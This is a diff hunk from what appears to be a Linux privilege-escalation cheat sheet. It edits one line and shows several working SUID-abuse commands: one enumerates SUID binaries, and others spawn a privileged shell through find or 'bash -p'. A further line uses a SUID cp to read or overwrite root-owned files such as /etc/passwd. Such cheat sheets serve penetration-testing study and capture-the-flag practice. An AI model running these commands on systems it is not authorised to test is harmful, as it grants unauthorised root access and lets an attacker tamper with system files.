@@ -29,7 +29,7 @@ find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
 ./find . -exec /bin/sh -p \; -quit
 ```
 ```bash
-bash-p                                  # if bash is SUID: ./bash -p
+./bash -p                               # if bash is SUID
 ```
 ```bash
 cp /etc/passwd /tmp/p                    # cp SUID -> read/overwrite root files
